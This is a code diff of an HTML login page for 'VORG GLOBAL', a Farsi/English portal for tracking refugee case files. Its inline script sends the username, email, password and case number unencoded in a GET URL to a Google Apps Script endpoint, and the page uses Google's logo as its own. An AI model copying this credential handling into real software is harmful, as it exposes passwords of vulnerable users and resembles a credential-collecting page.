@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="txt_title">VORG GLOBAL</title>
-    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/826/826070.png">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -12,16 +11,13 @@
 <div class="main-wrapper">
     <div class="visual-section">
         <div class="header-slider">
-            <div class="slide active" style="background-image: url('https://images.unsplash.com/photo-1526253038957-bce54e05968e?q=80&w=1470&auto=format&fit=crop')"></div>
-            <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1436491865332-7a61a109c0f2?q=80&w=1470&auto=format&fit=crop')"></div>
-            <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1569091791842-7cfb64e04797?q=80&w=1470&auto=format&fit=crop')"></div>
-            <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1540339832862-47452993293e?q=80&w=1374&auto=format&fit=crop')"></div>
-            <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1517486808906-6ca8b3f04846?q=80&w=1498&auto=format&fit=crop')"></div>
+           <div class="slide active" style="background-image: url('https://picsum.photos/1200/800?v=1')"></div>
+<div class="slide" style="background-image: url('https://picsum.photos/1200/800?v=2')"></div>
         </div>
         <div class="overlay-content">
-            <img src="https://cdn-icons-png.flaticon.com/512/984/984233.png" class="logo" alt="Travel Logo">
+<img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
             <h1 class="logo-text">VORG GLOBAL</h1>
-            <p>Follow & Manage you Refugee case file</p>
+            <p>Follow & Manage your Refugee case file</p>
         </div>
     </div>
 
@@ -29,30 +25,26 @@
         <div class="lang-switcher">
             <button onclick="changeLanguage('fa')">فارسی</button>
             <button onclick="changeLanguage('en')">English</button>
-            <button onclick="changeLanguage('it')">Italiano</button>
         </div>
 
         <div class="login-container">
-            <h2 id="txt_login_header">Login with verified account</h2>
+            <h2 id="txt_login_header">Login to Account</h2>
             
             <div class="field-group">
                 <input type="text" id="userName" placeholder="User Name">
                 <div id="err_userName" class="error-msg">❌ User not found</div>
             </div>
-
             <div class="field-group">
-                <input type="email" id="email" placeholder="Email Address">
+                <input type="email" id="email" placeholder="Email">
                 <div id="err_email" class="error-msg">❌ Email mismatch</div>
             </div>
-
             <div class="field-group">
                 <input type="password" id="password" placeholder="Password">
                 <div id="err_password" class="error-msg">❌ Incorrect password</div>
             </div>
-
             <div class="field-group">
                 <input type="text" id="caseNumber" placeholder="Case Number">
-                <div id="err_caseNumber" class="error-msg">❌ Invalid case number</div>
+                <div id="err_caseNumber" class="error-msg">❌ Invalid case</div>
             </div>
 
             <button id="loginBtn">Login to Panel</button>
@@ -60,25 +52,69 @@
     </div>
 </div>
 
-<div id="loading">
-    <img src="https://i.gifer.com/ZZ5H.gif" width="50" alt="Loading">
-</div>
+<div id="loading"><img src="https://i.gifer.com/ZZ5H.gif" width="50"></div>
 
 <footer id="main-footer">
     <div class="footer-sec">
-        <h4 id="txt_footer_1_h">Immigration Lawyers</h4>
-        <a href="#">Australia</a> <a href="#">UK</a> <a href="#">Schengen</a>
+        <h4 id="txt_footer_1_h">Lawyers</h4>
+        <a href="#">Australia</a> <a href="#">UK</a>
     </div>
     <div class="footer-sec">
-        <h4 id="txt_footer_2_h">Electronic Contract</h4>
-        <a href="#">New Contract</a> <a href="#">Track Request</a>
+        <h4 id="txt_footer_2_h">Contracts</h4>
+        <a href="#">New Request</a>
     </div>
     <div class="footer-sec">
-        <h4 id="txt_footer_3_h">Contact Us</h4>
-        <a href="#">Email</a> <a href="#">WhatsApp</a>
+        <h4 id="txt_footer_3_h">Contact</h4>
+        <a href="#">WhatsApp</a>
     </div>
 </footer>
 
-<script src="script.js"></script>
+<script>
+    const GOOGLE_API_URL = "https://script.google.com/macros/s/AKfycbyjvuEm6Trv1SokGDrPUQK9dPJoDnzlTVvORxTYB9mgnomGcxdJgLadFSwGaz6EoDesoA/exec";
+
+    // Slider
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    setInterval(() => {
+        slides[currentSlide].classList.remove('active');
+        currentSlide = (currentSlide + 1) % slides.length;
+        slides[currentSlide].classList.add('active');
+    }, 5000);
+
+    // Multi-lang
+    const translations = {
+        en: { dir: "ltr", login_header: "User Login", login_btn: "Login to Panel", empty: "Fill all fields", loading: "Welcome! Redirecting..." },
+        fa: { dir: "rtl", login_header: "ورود کاربری", login_btn: "ورود به پنل", empty: "تمام فیلدها را پر کنید", loading: "خوش آمدید! در حال انتقال..." }
+    };
+
+    function changeLanguage(lang) {
+        const t = translations[lang];
+        document.documentElement.dir = t.dir;
+        document.getElementById('txt_login_header').innerText = t.login_header;
+        document.getElementById('loginBtn').innerText = t.login_btn;
+    }
+
+    document.getElementById('loginBtn').addEventListener('click', () => {
+        const user = document.getElementById('userName').value;
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const caseNum = document.getElementById('caseNumber').value;
+
+        if(!user || !email || !pass || !caseNum) return alert("Empty fields!");
+
+        document.getElementById('loading').style.display = 'block';
+        fetch(`${GOOGLE_API_URL}?user=${user}&email=${email}&pass=${pass}&case=${caseNum}`)
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('loading').style.display = 'none';
+                if(data.success) {
+                    localStorage.setItem('userCaseNumber', caseNum);
+                    window.location.href = "panel.html";
+                } else {
+                    alert("Error in credentials");
+                }
+            });
+    });
+</script>
 </body>
 </html>
